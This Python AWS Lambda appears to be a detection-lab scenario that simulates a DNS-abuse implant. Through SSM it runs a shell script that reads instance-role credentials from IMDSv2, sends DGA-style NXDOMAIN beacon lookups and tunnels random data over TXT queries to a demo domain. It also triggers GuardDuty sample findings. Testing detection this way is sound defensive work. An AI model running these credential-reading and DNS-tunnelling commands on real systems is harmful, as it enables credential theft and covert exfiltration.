"""Simulated DNS-abuse implant (DNS plane).

Like scenario 2, the plane's signatures only exist if traffic actually leaves
the box - here, DNS lookups against the Amazon-provided resolver. So this Lambda
plays the operator OFF the box and drives a shell script ON it via
ssm:SendCommand. That script:

  1. Reads the instance role's credentials from IMDSv2 (the "theft").
  2. BEACONS: resolves a rotating set of pseudo-random labels under a domain it
     doesn't control - a storm of NXDOMAIN lookups (the DGA / C2 shopping-for-a-
     handler pattern).
  3. TUNNELS: encodes random bytes into long, high-entropy first labels and
     resolves them (TXT) against a demo exfil domain - data leaving one query at
     a time.

Nothing needs to actually resolve; the lookups themselves are the signal, and
Route 53 Resolver logs them whether they succeed or NXDOMAIN.

The Lambda execution role is used for ONE demo-only thing beyond SSM: firing
GuardDuty sample findings (the DNS-native finding types) so the detect pipeline
is testable without waiting days for a real finding.
"""

import os
import time

import boto3
from botocore.exceptions import ClientError

REGION = os.environ.get("AWS_REGION", "us-east-1")


def wait_until_managed(ssm, instance_id, attempts=20, delay=15):
    """Poll until the instance is an Online SSM-managed instance.

    AL2023 ships the SSM agent, but registration lags boot by 1-3 min. Until the
    instance shows up here, ssm:SendCommand fails with InvalidInstanceId.
    """
    for i in range(attempts):
        info = ssm.describe_instance_information(
            Filters=[{"Key": "InstanceIds", "Values": [instance_id]}]
        ).get("InstanceInformationList", [])
        if info and info[0].get("PingStatus") == "Online":
            print(f"[+] instance {instance_id} is SSM-managed (Online)")
            return True
        print(f"[.] attempt {i + 1}: {instance_id} not SSM-managed yet; sleeping {delay}s")
        time.sleep(delay)
    raise RuntimeError(f"instance {instance_id} never became SSM-managed")


def attack_script(beacon_domain, tunnel_domain, beacon_count, tunnel_count, label_len):
    """The shell the attacker runs on the box. Kept POSIX-simple and idempotent
    enough to re-fire. Uses `dig` (installed on demand) so we control the query
    TYPE - TXT for tunnelling, plain A for the beacon - which plain getent/curl
    can't do."""
    return [
        "set -u",
        "echo '== simulated DNS-abuse implant =='",
        # --- 1) steal the instance role creds from IMDSv2 (the theft) ---
        'TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" '
        '-H "X-aws-ec2-metadata-token-ttl-seconds: 300")',
        'ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" '
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
        'echo "[+] stole instance role creds for ${ROLE:-<none>}"',
        # --- ensure a DNS tool with per-query TYPE control ---
        "command -v dig >/dev/null 2>&1 || sudo dnf install -y -q bind-utils "
        "|| dnf install -y -q bind-utils || echo '[.] could not install bind-utils; "
        "falling back to nslookup'",
        'DIG=$(command -v dig || true)',
        # --- 2) beacon: a DGA NXDOMAIN storm to a domain we do not control ---
        f'echo "[+] beaconing {beacon_count} pseudo-random labels under {beacon_domain} (expect NXDOMAIN)"',
        f"for i in $(seq 1 {beacon_count}); do "
        "label=$(head -c 8 /dev/urandom | base32 | tr 'A-Z' 'a-z' | tr -d '=' | cut -c1-16); "
        f'name="$label.{beacon_domain}"; '
        'if [ -n "$DIG" ]; then dig +tries=1 +time=2 +short "$name" >/dev/null 2>&1; '
        'else nslookup -timeout=2 "$name" >/dev/null 2>&1; fi; done || true',
        # --- 3) tunnel: long high-entropy first labels on TXT (data leaving) ---
        f'echo "[+] tunnelling {tunnel_count} long labels (len>={label_len}) to {tunnel_domain} over TXT"',
        f"for i in $(seq 1 {tunnel_count}); do "
        f"label=$(head -c 64 /dev/urandom | base32 | tr 'A-Z' 'a-z' | tr -d '=' | cut -c1-{label_len}); "
        f'name="$label.{tunnel_domain}"; '
        'if [ -n "$DIG" ]; then dig +tries=1 +time=2 TXT "$name" >/dev/null 2>&1; '
        'else nslookup -type=TXT -timeout=2 "$name" >/dev/null 2>&1; fi; done || true',
        'echo "== done =="',
    ]


def run_on_box(ssm, instance_id):
    commands = attack_script(
        beacon_domain=os.environ["BEACON_DOMAIN"],
        tunnel_domain=os.environ["TUNNEL_DOMAIN"],
        beacon_count=int(os.environ.get("BEACON_COUNT", "60")),
        tunnel_count=int(os.environ.get("TUNNEL_COUNT", "40")),
        label_len=int(os.environ.get("TUNNEL_LABEL_LEN", "30")),
    )
    sent = ssm.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Comment="atkplane scenario-03 simulated DNS abuse",
        Parameters={"commands": commands},
        TimeoutSeconds=600,
    )
    command_id = sent["Command"]["CommandId"]
    print(f"[+] ssm:SendCommand {command_id} -> {instance_id}")

    # Best-effort: wait briefly for completion so the invocation surfaces errors.
    for _ in range(20):
        time.sleep(6)
        try:
            inv = ssm.get_command_invocation(CommandId=command_id, InstanceId=instance_id)
        except ClientError as exc:
            if exc.response["Error"]["Code"] == "InvocationDoesNotExist":
                continue
            raise
        status = inv["Status"]
        if status in ("Success", "Failed", "Cancelled", "TimedOut"):
            print(f"[i] command {status}")
            if inv.get("StandardOutputContent"):
                print(inv["StandardOutputContent"])
            if status != "Success" and inv.get("StandardErrorContent"):
                print(f"[-] stderr: {inv['StandardErrorContent']}")
            return command_id, status
    print("[i] command still running; returning without waiting further")
    return command_id, "InProgress"


def handler(event, context):
    instance_id = os.environ["INSTANCE_ID"]
    ssm = boto3.client("ssm", region_name=REGION)

    wait_until_managed(ssm, instance_id)
    command_id, status = run_on_box(ssm, instance_id)

    # Demo helper (NOT the attacker): fire the DNS-native GuardDuty sample
    # findings via the execution role so the EventBridge -> SNS pipeline is
    # exercised deterministically. Real DNS findings need days of baseline.
    detector = os.environ.get("DETECTOR_ID", "")
    if detector:
        gd = boto3.client("guardduty", region_name=REGION)
        for finding in (
            "Trojan:EC2/DNSDataExfiltration",
            "Backdoor:EC2/C&CActivity.B!DNS",
            "Trojan:EC2/DGADomainRequest.C",
        ):
            try:
                gd.create_sample_findings(DetectorId=detector, FindingTypes=[finding])
                print(f"[+] guardduty sample finding generated: {finding}")
            except ClientError as exc:
                print(f"[-] create_sample_findings failed for {finding} "
                      f"({exc.response['Error']['Code']})")

    return {
        "status": "attack dispatched",
        "instance_id": instance_id,
        "command_id": command_id,
        "command_status": status,
    }
